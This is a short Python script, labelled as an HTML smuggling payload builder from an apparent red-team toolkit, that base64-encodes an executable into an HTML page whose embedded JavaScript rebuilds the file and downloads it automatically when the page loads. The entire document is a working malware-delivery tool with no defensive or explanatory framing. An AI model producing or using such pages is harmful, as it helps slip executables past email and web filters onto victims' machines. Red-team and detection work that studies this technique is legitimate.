#!/usr/bin/env python3
# CADRE — WT066 — HTML Smuggling Payload Builder
# Usage: python3 wt066-html-smuggling.py <payload.exe> <output.html>
import base64, sys, os

with open(sys.argv[1], "rb") as f:
    data = f.read()
b64 = base64.b64encode(data).decode()
name = os.path.basename(sys.argv[1])

html = f"""<!DOCTYPE html><html><body><script>
var b='{b64}';var r=atob(b);var u=new Uint8Array(r.length);
for(var i=0;i<r.length;i++){{u[i]=r.charCodeAt(i);}}
var bl=new Blob([u],{{type:'application/octet-stream'}});
var a=document.createElement('a');a.href=URL.createObjectURL(bl);
a.download='{name}';document.body.appendChild(a);a.click();
setTimeout(function(){{document.body.removeChild(a);}},1000);
</script></body></html>"""

with open(sys.argv[2], "w") as f:
    f.write(html)
print(f"Created: {sys.argv[2]} ({len(data)} bytes payload)")
